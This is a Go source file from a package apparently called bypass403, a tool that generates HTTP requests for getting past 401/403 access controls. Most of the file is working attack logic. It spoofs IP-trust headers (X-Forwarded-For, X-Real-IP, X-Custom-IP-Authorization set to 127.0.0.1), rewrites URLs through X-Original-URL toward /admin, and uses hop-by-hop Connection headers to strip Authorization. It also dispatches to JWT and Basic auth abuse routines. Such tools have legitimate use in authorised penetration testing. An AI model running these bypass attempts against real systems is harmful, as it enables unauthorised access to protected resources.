package bypass403

import (
	"net/url"
	"strings"
)

// ParseWWWAuthenticate classifies the auth challenge from a response header.
func ParseWWWAuthenticate(raw string) AuthScheme {
	raw = strings.TrimSpace(raw)
	scheme := AuthScheme{Raw: raw, Params: map[string]string{}}
	if raw == "" {
		return scheme
	}
	lower := strings.ToLower(raw)
	switch {
	case strings.HasPrefix(lower, "bearer"):
		scheme.Kind = "Bearer"
		scheme.HasBearer = true
	case strings.HasPrefix(lower, "basic"):
		scheme.Kind = "Basic"
		scheme.HasBasic = true
	case strings.HasPrefix(lower, "digest"):
		scheme.Kind = "Digest"
		parseDigestParams(raw, &scheme)
	default:
		scheme.Kind = "Custom"
		if strings.Contains(lower, "bearer") {
			scheme.HasBearer = true
		}
		if strings.Contains(lower, "basic") {
			scheme.HasBasic = true
		}
	}
	return scheme
}

func parseDigestParams(raw string, scheme *AuthScheme) {
	parts := strings.SplitN(raw, " ", 2)
	if len(parts) < 2 {
		return
	}
	for _, seg := range strings.Split(parts[1], ",") {
		seg = strings.TrimSpace(seg)
		if kv := strings.SplitN(seg, "=", 2); len(kv) == 2 {
			scheme.Params[strings.TrimSpace(kv[0])] = strings.Trim(strings.TrimSpace(kv[1]), `"`)
		}
	}
}

// BuildAuthBypassAttempts returns path/header bypasses plus auth-layer probes for 401/403 targets.
func BuildAuthBypassAttempts(rawURL, method string, baseline Baseline) []Attempt {
	attempts := BuildAttempts(rawURL, method)
	attempts = append(attempts, buildAuthHeaderPollution(rawURL, method)...)
	attempts = append(attempts, buildHopByHopStripAttempts(rawURL, method)...)
	if baseline.StatusCode == 401 || baseline.AuthScheme.HasBearer {
		attempts = append(attempts, buildJWTBearerAttempts(rawURL, method)...)
	}
	if baseline.StatusCode == 401 && baseline.AuthScheme.HasBasic {
		attempts = append(attempts, buildBasicAuthAttempts(rawURL, method)...)
	}
	return dedupeAttempts(attempts)
}

func buildAuthHeaderPollution(rawURL, method string) []Attempt {
	if method == "" {
		method = "GET"
	}
	u, err := url.Parse(rawURL)
	if err != nil {
		return nil
	}
	path := u.Path
	if path == "" {
		path = "/"
	}
	var out []Attempt
	add := func(label string, headers map[string]string) {
		out = append(out, Attempt{Category: AuthHeaderPollution, Label: label, Method: method, URL: rawURL, Headers: headers})
	}

	add("x_custom_ip_authorization", map[string]string{"X-Custom-IP-Authorization": "127.0.0.1"})
	add("x_remote_ip", map[string]string{"X-Remote-IP": "127.0.0.1"})
	add("x_forwarded_host_local", map[string]string{"X-Forwarded-Host": "localhost", "X-Forwarded-For": "127.0.0.1"})
	add("x_original_url_full", map[string]string{"X-Original-URL": path, "X-Rewrite-URL": path})
	add("x_rewrite_url_root", map[string]string{"X-Rewrite-URL": "/"})
	add("x_original_url_admin", map[string]string{"X-Original-URL": "/admin"})
	add("forwarded_for_internal", map[string]string{
		"X-Forwarded-For":  "127.0.0.1, 10.0.0.1",
		"X-Real-IP":        "127.0.0.1",
		"X-Originating-IP": "127.0.0.1",
	})
	return out
}

func buildHopByHopStripAttempts(rawURL, method string) []Attempt {
	if method == "" {
		method = "GET"
	}
	var out []Attempt
	add := func(label string, headers map[string]string) {
		out = append(out, Attempt{Category: HopByHopStrip, Label: label, Method: method, URL: rawURL, Headers: headers})
	}
	// Proxies may drop listed hop-by-hop headers before forwarding.
	add("connection_strip_authorization", map[string]string{
		"Connection":    "close, Authorization",
		"Authorization": "",
	})
	add("connection_keepalive_strip", map[string]string{
		"Connection":    "keep-alive, Authorization, Cookie",
		"Authorization": "Bearer stripped",
	})
	add("connection_te_authorization", map[string]string{
		"Connection":    "TE, Authorization, close",
		"Authorization": "Bearer null",
	})
	add("duplicate_authorization_empty", map[string]string{
		"Authorization": "",
	})
	return out
}

func dedupeAttempts(in []Attempt) []Attempt {
	seen := map[string]struct{}{}
	var out []Attempt
	for _, a := range in {
		key := a.Method + "|" + a.URL + "|" + a.Label
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		out = append(out, a)
	}
	return out
}

func AllCategories() []TechniqueCategory {
	return []TechniqueCategory{
		PathNormalization, EncodedPath, CaseVariant, TrailingSlashDot, MethodChange,
		MethodOverrideHeader, ForwardedURLHeader, IPTrustHeader, ProtocolPortHeader, ContentNegotiation,
		AuthHeaderPollution, HopByHopStrip, JWTBearerAbuse, BasicAuthAbuse,
	}
}
